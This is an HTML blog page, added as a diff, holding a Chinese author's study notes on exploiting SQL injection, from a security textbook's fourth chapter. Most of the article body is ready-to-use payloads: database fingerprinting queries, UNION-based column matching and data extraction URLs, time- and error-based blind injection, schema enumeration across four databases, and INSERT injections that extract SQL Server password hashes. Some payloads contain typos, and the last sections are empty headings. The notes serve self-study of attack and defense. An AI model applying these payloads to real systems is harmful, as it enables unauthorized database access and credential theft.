@@ -1,0 +1,932 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.css" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+  
+
+<link href="//cdn.bootcss.com/font-awesome/4.4.0/fonts/fontawesome-webfont.svg" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="安全,sql注入," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/favicon.ico?v=5.0.1" />
+
+
+
+
+
+
+<meta name="description" content="识别数据库
+asp和.net通常使用sqlserver，php则是mysql或者postgresql。java的是oracle或者mysql。
+
+非盲跟踪
+使用’触发报错，根据报错信息得知数据库信息
+
+获取标志信息
+表：在返回各种数据库服务器时对应的查询
+| 数据库服务器     | 查询                                       || ———- | —————">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Sql注入攻击与防御总结：第4章 利用SQL注入">
+<meta property="og:url" content="http://www.fatiao.site/anquan_sqlinj24.html">
+<meta property="og:site_name" content="小发条的技术人生">
+<meta property="og:description" content="识别数据库
+asp和.net通常使用sqlserver，php则是mysql或者postgresql。java的是oracle或者mysql。
+
+非盲跟踪
+使用’触发报错，根据报错信息得知数据库信息
+
+获取标志信息
+表：在返回各种数据库服务器时对应的查询
+| 数据库服务器     | 查询                                       || ———- | —————">
+<meta property="og:updated_time" content="2016-09-29T07:40:26.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Sql注入攻击与防御总结：第4章 利用SQL注入">
+<meta name="twitter:description" content="识别数据库
+asp和.net通常使用sqlserver，php则是mysql或者postgresql。java的是oracle或者mysql。
+
+非盲跟踪
+使用’触发报错，根据报错信息得知数据库信息
+
+获取标志信息
+表：在返回各种数据库服务器时对应的查询
+| 数据库服务器     | 查询                                       || ———- | —————">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://www.fatiao.site/anquan_sqlinj24.html"/>
+
+  <title> 安全,sql注入, - Sql注入攻击与防御总结：第4章 利用SQL注入 | 小发条的技术人生 </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//tajs.qq.com/stats?sId=58555379";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">小发条的技术人生</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle">测试攻城狮 pythoner 伪程序猿一枚</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                Sql注入攻击与防御总结：第4章 利用SQL注入
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2011-07-22T00:00:00+08:00" content="2011-07-22">
+              2011-07-22
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/anquan_sqlinj24.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="anquan_sqlinj24.html" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/anquan_sqlinj24.html" class="leancloud_visitors" data-flag-title="Sql注入攻击与防御总结：第4章 利用SQL注入">
+               &nbsp; | &nbsp;
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <ol>
+<li><p>识别数据库</p>
+<p>asp和.net通常使用sqlserver，php则是mysql或者postgresql。java的是oracle或者mysql。</p>
+<ol>
+<li><p>非盲跟踪</p>
+<p>使用’触发报错，根据报错信息得知数据库信息</p>
+<ol>
+<li><p>获取标志信息</p>
+<p>表：在返回各种数据库服务器时对应的查询</p>
+<p>| 数据库服务器     | 查询                                       |<br>| ———- | —————————————- |<br>| sql server | select @@version                         |<br>| mysql      | select version()                                                        select @@version |<br>| oracle     | select banner from v$version                                                  select banner from v$version where rownum=1 |<br>| postgesql  | select version()                         |</p>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+</ol>
+<p>​<a id="more"></a>         ​</p>
+<ol>
+<li><p>盲跟踪—从字符串推断数据库服务器版本</p>
+<p>原理：利用不同产品在链接字符串方式上的差异</p>
+<p>表：从字符串推断数据库服务器版本</p>
+<p>| 数据库服务器     | 查询                                       |<br>| ———- | —————————————- |<br>| sql server | select ‘some’ + ‘string’                 |<br>| mysql      | select ‘some’ ‘string’                                                    select concat(‘some’, ‘string’) |<br>| oracle     | select ‘some’ || ‘string’                                                   select concat(‘some’, ‘string’) |<br>| postgresql | select ‘some’ || ‘string’                                                 select concat(‘some’, ‘string’) |</p>
+<p>如果有一个可注入的字符串，便可以尝试不用的连接语法，通过判断哪一个请求会返回与原始请求相同的结果  </p>
+<p>​</p>
+<p>表：从数字函数推断数据库服务器版本</p>
+<p>| 数据库服务器     | 查询                                       |<br>| ———- | —————————————- |<br>| sqlserver  | @@pack_received                                       @@rowcount |<br>| mysql      | connection_id()                                             last_insert_id()                                                   row_count() |<br>| oracle     | BITAND(1,1)                              |<br>| postgresql | select extract(dow from now())           |</p>
+<p>​</p>
+</li>
+<li><p>使用特定的sql结构</p>
+<p>例如不同数据库盲注延迟</p>
+<p>| 数据库        | 命令           |<br>| ———- | ———— |<br>| sqlserver  | waiter delay |<br>| postgresql | pg_seleep()  |<br>| oracle     |              |<br>| mysql      | benchmark()  |</p>
+<p>​</p>
+<p>​</p>
+</li>
+</ol>
+<ol>
+<li><p>使用uinon语句提取数据</p>
+<p>基本语法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">column</span><span class="number">-1</span>,<span class="keyword">column</span><span class="number">-2</span>,...column-n, <span class="keyword">from</span> <span class="keyword">table</span><span class="number">-1</span></div><div class="line"><span class="keyword">union</span></div><div class="line"><span class="keyword">select</span> <span class="keyword">column</span><span class="number">-1</span>,<span class="keyword">column</span><span class="number">-2</span>,...column-n, <span class="keyword">from</span> <span class="keyword">table</span><span class="number">-2</span></div></pre></td></tr></table></figure>
+<p>如果应用程序返回了第一个查询得到的所有数据，那么通过在第一个查询后面注入一个union运算符,并添加另外一个任意查询，便可以读到数据库用户访问过的任意一张表。</p>
+<ol>
+<li><p>匹配列</p>
+<p>要想union操作符正确工作，需满足下列要求</p>
+<ul>
+<li>两个查询返回的列数必须相同</li>
+<li><p>两个select语句对应列所返回的数据类型必须相同</p>
+<p>如果无法满足上述两个约束条件，查询变回失败并返回一个错误。该错误消息在应用向用户返回完整的消息时可作为一种非常有用的跟踪工具。</p>
+</li>
+</ul>
+<p>表：从基于unicon的错误中推断数据库服务器版本</p>
+<p>| 数据库服务器     | 返回的错误消息                                  |<br>| ———- | —————————————- |<br>| sql server | all queries combined using a union,intersect or exccept operator must have an equal number of expressions in their target lists |<br>| mysql      | the used select statements have a different number of columns |<br>| oracle     | ora-01789:quert block has incorrect number of result columns |<br>| postgresql | error:each union query must have the same number of columns |</p>
+<p>​</p>
+<p>获得正确的列数的方法</p>
+<ol>
+<li><p>将第二条查询注入多次，每次逐渐增大列数知道查询正确执行，对于大多数较新的数据库服务器，由于Null值会被转换成任何数据类型，因此可以为每一列都注入null值，这样便能避免因相同的列的数据类型不同而引发的错误。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://url/pro.asp?id=12+union+select+null--</div><div class="line">http://url/pro.asp?id=12+union+select+null,null--</div><div class="line">http://url/pro.asp?id=12+union+select+null,null,null--</div><div class="line">... -- oracle要求每个select 要有from</div><div class="line">http://url/pro.asp?id=12+union+select+null + from + dual--</div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>使用order by子句而非注入另外一个查询。order by 子句既可以接受一个列名作为参数，也可以接受一个简单的，能标识特定列的数字。可以通过增大order by 子句中代表猎德数字来识别查询中的列数。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://url/pro.asp?id=12+order+by+1</div><div class="line">http://url/pro.asp?id=12+order+by+2</div><div class="line">http://url/pro.asp?id=12+order+by+3</div><div class="line">如果到6的时候报错，则说明只有5列。</div></pre></td></tr></table></figure>
+<p>通常第二种方法好一些，因为速度快，并且使用二分法，尝试的次数少。</p>
+<p>​</p>
+</li>
+</ol>
+</li>
+<li><p>匹配数据类型</p>
+<p>识别出准确的列数后，选择其中的一列或几列查看一下是否是正在寻找的数据。对应的数据类型必须是兼容的。如果提取一个字符串，那么至少需要好到一个数据类型为字符串的列以便通过它来存储正在寻找的数据。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">http://url/pro.asp?id=12+union+select + &apos;test&apos;, null, null,null</div><div class="line">http://url/pro.asp?id=12+union+select + null,&apos;test&apos;, null,null</div><div class="line">http://url/pro.asp?id=12+union+select + null,null, &apos;test&apos;,null</div><div class="line">...</div><div class="line"></div><div class="line">http://url/pro.asp?id=12+union+select + null,system_user, null,null  -- 使用这个提取system_user</div><div class="line">http://url/pro.asp?id=12+union+select + null,system_user, db_name(),null -- 提取db_name()失败</div><div class="line">http://url/pro.asp?id=12+union+select + null,system_user%2B&apos;+|+&apos;%2Bdb_name(), null,null  -- 将两者连接</div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> col1 <span class="keyword">from</span> tab1 <span class="keyword">union</span> <span class="keyword">select</span> cola +<span class="string">'|'</span> + colb <span class="keyword">from</span> tablea <span class="comment">-- col1 cola colb 必须是字符串才可以，如果不是，则需要类型转换</span></div></pre></td></tr></table></figure>
+<p>​</p>
+<p>表：强制类型转换运算符</p>
+<p>| 数据库服务器     | 查询                                    |<br>| ———- | ————————————- |<br>| sqlserver  | select cast(‘123’ as varchar)         |<br>| mysql      | select cast(‘123’ as char)            |<br>| oracle     | select cast(‘1’ as varchar) from dual |<br>| postgresql | select cast(123 as text)              |</p>
+<p>​</p>
+</li>
+</ol>
+</li>
+<li><p>条件语句</p>
+<p>语法：if condition then do_something else do_something_else</p>
+<p>思想：强迫服务器执行不同的行为并根据指定的条件返回不同的结果</p>
+<p>| 数据库服务器     | 查询                                       |<br>| ———- | —————————————- |<br>| sqlserver  | if(‘a’=’a’)  select 1 else select 2      |<br>| mysql      | select if(‘a’,1,2)                       |<br>| oracle     | select case when ‘a’=’a’ then 1 else 2                                  end from dual                                                                     select decode(substr(user,1,1),’A’,1,2) from dual |<br>| postgresql | select case when(1=1) then ‘a’ else ‘b’ en |</p>
+<ol>
+<li><p>方法1：基于时间</p>
+<p>基于web应用响应时间上的差异，该信息取决于某些时间的值</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">sqlserver if(system_user='sa') waitfor delay '0:0:5' <span class="comment">--</span></div><div class="line">http://url/pro.asp?id=12;if+(system_user='sa')+waitfor+delay+'0:0:5' <span class="comment">--  对应的url。通过延迟来判断当前用户是否为sa</span></div><div class="line"></div><div class="line">mysql</div><div class="line"><span class="keyword">select</span> <span class="keyword">benchmark</span>(<span class="number">1000000</span>,<span class="keyword">sha1</span>(<span class="string">'blah'</span>));</div><div class="line"><span class="keyword">select</span> <span class="keyword">sleep</span>(<span class="number">5</span>);</div><div class="line"></div><div class="line">postgresql</div><div class="line"><span class="keyword">select</span> pg_sleep(<span class="number">5</span>);</div><div class="line"></div><div class="line">oracle</div><div class="line"><span class="keyword">select</span> url_http.request(<span class="string">'http://10.0.0.1'</span>) <span class="keyword">from</span> dual;</div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>方法2：基于错误</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">http://url/pro.asp?id=12/is_srvrolemember(&apos;sysadmin&apos;)</div><div class="line">--  is_srvromember()   返回1或0</div><div class="line">​</div><div class="line"></div><div class="line">case语法</div><div class="line">case when condition then action1 else action2 end</div><div class="line">例子</div><div class="line">http://url/pro.asp?id=12/(case+when+(system_user=&apos;sa&apos;)+then+1+else+0+end)</div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>方法3：基于内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">http://url/pro.asp?id=12+(case+when+(system_user=&apos;sa&apos;)+then+1+else+0+end)</div><div class="line">如果用户是sa</div><div class="line">id=12</div><div class="line">如果用户不是sa</div><div class="line">id=13</div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>处理字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">http://url/search.asp?brand=acme</div><div class="line">http://url/search.asp?brand=acle</div><div class="line">http://url/search.asp?brand=acm&apos;%2B&apos;e --%2B是+号的url编码</div><div class="line">http://url/search.asp?brand=ac&apos;%2B&apos;m&apos;%2B&apos;e</div><div class="line">http://url/search.asp?brand=ac&apos;%2Bchar(109)%2B&apos;e</div><div class="line">http://url/search.asp?brand=ac&apos;%2Bchar(108%2（case+when+(system_user+=+&apos;sa&apos;)+then+1+else+0+end)%2B&apos;e</div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>扩展攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">select len(system_user)  -- 显示用户名长度</div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>利用sql注入错误</p>
+<p>注入错误的信息，从返回信息中确认数据库字段情况</p>
+<p>​</p>
+</li>
+<li><p>oracle中的错误消息</p>
+</li>
+</ol>
+<p>​</p>
+</li>
+<li><p>枚举数据库模式</p>
+<p>要想枚举远程数据库中的表和列，您需要访问专门保存描述各种数据库结构的表。想要成功访问，需要先确认执行查询的用户必须已获取访问这些元数据的授权。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">sqlserver</div><div class="line">select name from master..sysdatabases -- 检索出名称列表</div><div class="line">http://url/products.asp?id=2</div><div class="line">http://url/products.asp?id=2+union+select+null,name,null,null+from+master..sysdatabases</div><div class="line">http://url/products.asp?id=2+union+select+null,name,null,null+from+e-shop..sysobjects+where+xtype%3d&apos;u&apos; --</div><div class="line"></div><div class="line">select name from e-shop..syscolumns where id=(select id from e-shop..sysobjects where name=&apos;customers&apos;)</div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">mysql</div><div class="line">在mysql中，枚举数据库并提取数据也遵循一张层次化的方法：首先提取数据库名称，然后转向表，列，最后是数据本身。</div><div class="line"><span class="keyword">select</span> <span class="keyword">user</span>();</div><div class="line"><span class="keyword">select</span> <span class="keyword">current_user</span>;</div><div class="line"><span class="keyword">select</span> <span class="keyword">distinct</span>(db) <span class="keyword">from</span> mysql.db; <span class="comment">-- 列出所有数据库  当前用户的</span></div><div class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata; <span class="comment">--获取数据库</span></div><div class="line"><span class="keyword">select</span> table_schema,table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema = <span class="string">'bd_use'</span>; <span class="comment">-- 查看该库的所有表</span></div><div class="line"><span class="keyword">select</span> table_schema,table_name, column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> column_schema <span class="keyword">like</span> <span class="string">'password'</span> <span class="keyword">or</span> column_name <span class="keyword">like</span> <span class="string">'credit_card'</span>; <span class="comment">-- 查看所有列名为password的列信息</span></div><div class="line"><span class="keyword">select</span> grantee, table_schema, privilege_type <span class="keyword">from</span> information_schema.schema_privileges; <span class="comment">-- 数据库用户名权限及授权</span></div><div class="line"><span class="keyword">select</span> <span class="keyword">database</span>(); <span class="comment">-- 当前数据库名</span></div><div class="line"><span class="keyword">select</span> @@datadir; <span class="comment">-- 数据库文件的保存路径</span></div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">postgresql</div><div class="line"><span class="keyword">select</span> datname <span class="keyword">from</span> pg_database;</div><div class="line"><span class="keyword">select</span> username <span class="keyword">from</span> pg_user;</div><div class="line"><span class="keyword">select</span> <span class="keyword">user</span>;</div><div class="line"><span class="keyword">select</span> <span class="keyword">current_user</span>;</div><div class="line"><span class="keyword">select</span> <span class="keyword">session_user</span>;</div><div class="line"><span class="keyword">select</span> getpgusername();</div><div class="line"></div><div class="line"><span class="comment">--枚举其中所有模式中的全部表</span></div><div class="line"><span class="keyword">select</span> c.relname <span class="keyword">from</span> pg_catalog.pg_class c <span class="keyword">left</span> <span class="keyword">join</span> pg_catalog.pg_namespace n <span class="keyword">on</span> n.oid=c.relnamespace <span class="keyword">where</span> c.relkind <span class="keyword">in</span> (<span class="string">'r'</span>,<span class="string">''</span>) <span class="keyword">and</span> n.nspname <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">'pg_catalog'</span>,<span class="string">'pg_toast'</span>) <span class="keyword">and</span> pg_catalog.pg_tabe_is_visible(c.oid) </div><div class="line"><span class="keyword">select</span> tablename <span class="keyword">from</span> pg_tables <span class="keyword">where</span> tablename <span class="keyword">not</span> <span class="keyword">like</span> <span class="string">'pg_%'</span> <span class="keyword">and</span> tablename <span class="keyword">not</span> <span class="keyword">like</span> <span class="string">'sql_%'</span></div><div class="line"></div><div class="line"><span class="comment">--提取所有列的一个列表</span></div><div class="line"><span class="keyword">select</span> relname,A.attname <span class="keyword">from</span> pg_class C,pg_namespace N,pg_attribute A,pg_type T <span class="keyword">where</span> (C.relkind=<span class="string">'r'</span>) <span class="keyword">and</span> (N.oid=C.relnamespace) <span class="keyword">and</span> (A.attrelid=C.oid) <span class="keyword">and</span> (A.atttypid=T.oid) <span class="keyword">and</span> (A.attnum&gt;<span class="number">0</span>) <span class="keyword">and</span> (<span class="keyword">not</span> A.attisdropped) <span class="keyword">and</span> (N.nspname <span class="keyword">ilike</span> <span class="string">'public'</span>)</div></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">oracle</div><div class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables;</div><div class="line"><span class="keyword">select</span> owner,table_name <span class="keyword">from</span> all_tables;</div><div class="line"></div><div class="line"><span class="comment">--枚举更多关于应用标的信息以确定表中出现的列数和行数</span></div><div class="line"><span class="keyword">select</span> a.table_name || <span class="string">'['</span>||<span class="keyword">count</span>(*)||<span class="string">']'</span>||num_rows <span class="keyword">from</span> user_tab_columns a,user_tables b <span class="keyword">where</span> a.table_name=b.table_name <span class="keyword">group</span> <span class="keyword">by</span> a.table_name,num_rows</div><div class="line"></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_sys_privs; <span class="comment">-- 获取当前用户的系统权限</span></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_role_privs; <span class="comment">-- 获取当前角色权限</span></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_tab_privs;<span class="comment">-- 获取当前用户表格权限</span></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> user_col_privs;<span class="comment">-- 获取当前用户列权限</span></div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>在insert查询中实施注入攻击   a.插入用户规定的数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span>(col1,col2) <span class="keyword">values</span> (<span class="string">'john'</span>, <span class="string">'smith'</span>)</div><div class="line"></div><div class="line"><span class="string">'john'</span>, (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> + <span class="string">'|'</span> + master.sys.fn varbintohexstr(<span class="keyword">password</span> <span class="keyword">hash</span>) <span class="keyword">from</span> sys.sql logins))<span class="comment">-- </span></div><div class="line"></div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span>(col1,col2) <span class="keyword">values</span> (<span class="string">'john'</span>, (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> + <span class="string">'|'</span> + master.sys.fn varbintohexstr(<span class="keyword">password</span> <span class="keyword">hash</span>) <span class="keyword">from</span> sys.sql logins))<span class="comment">-- ',' 'smith')</span></div><div class="line"></div><div class="line">为第二列中插入书库，注入一个子查询</div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>在insert查询中实施注入攻击   </p>
+<ol>
+<li><p>插入用户规定的数据</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span>(col1,col2) <span class="keyword">values</span> (<span class="string">'injectable'</span>,<span class="string">'not injectable'</span>);</div><div class="line">Url：</div><div class="line">http://url/update.asp?firstname=john&amp;lastname=smith</div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span>(firstname,lastname) <span class="keyword">values</span> (<span class="string">'john'</span>,<span class="string">'smith'</span>)</div><div class="line">注入下面的字符串</div><div class="line">john<span class="string">',(select top 1 name + '</span>|<span class="string">' master.sys.fn_varbintohexstr(password_hash) from sys.sql_logins))--</span></div><div class="line">完整的sql如下</div><div class="line">insert into table(firstname,lastname) values ('john<span class="string">',(select top 1 name + '</span>|<span class="string">' master.sys.fn_varbintohexstr(password_hash) from sys.sql_logins))--'</span>,<span class="string">'smith'</span>)</div><div class="line">​</div><div class="line"></div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span>(col1,col2) <span class="keyword">values</span> (<span class="string">'not injectable'</span>,<span class="string">'injectable'</span>);</div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> (col1,col2) vaules(<span class="string">'foo'</span>,<span class="string">'bar'</span>||(<span class="keyword">select</span> @@<span class="keyword">version</span>)) <span class="comment">-- 方法一</span></div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> (col1,col2) vaules(<span class="string">'foo'</span>,<span class="keyword">concat</span>(<span class="string">'bar'</span>,(<span class="keyword">select</span> @@<span class="keyword">version</span>)))) <span class="comment">-- 方法二</span></div><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> (col1,col2) vaules(<span class="string">'foo'</span>,<span class="string">'d'</span>+<span class="keyword">substring</span>((<span class="keyword">select</span> @@<span class="keyword">version</span>),<span class="number">1</span>,<span class="number">1</span>)+<span class="string">''</span>) <span class="comment">-- 方法三</span></div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>生成insert错误</p>
+<p>在Insert查询未成功执行的情况下实现信息的提取</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> (<span class="keyword">name</span>, age) <span class="keyword">value</span> (<span class="string">'foo'</span>, <span class="number">10</span>) <span class="comment">-- 正常查询</span></div><div class="line">foo<span class="string">',(select top 1 name from users where age=@@verrsion))--  在name字段那注入错误</span></div><div class="line">-- 因为错误的类型插入会报错，报错内容会提示出数据库信息</div></pre></td></tr></table></figure>
+<p>​</p>
+</li>
+<li><p>其它情形</p>
+</li>
+</ol>
+<p>​</p>
+</li>
+<li><p>提升权限</p>
+<ol>
+<li><p>sqlserver</p>
+</li>
+<li><p>在未打补丁的机器上提升权限</p>
+</li>
+<li><p>sys.dbms_cdc_pubkish</p>
+<p>​</p>
+</li>
+</ol>
+</li>
+<li><p>窃取哈希口令</p>
+</li>
+<li><p>带外通信</p>
+<p>​</p>
+</li>
+</ol>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
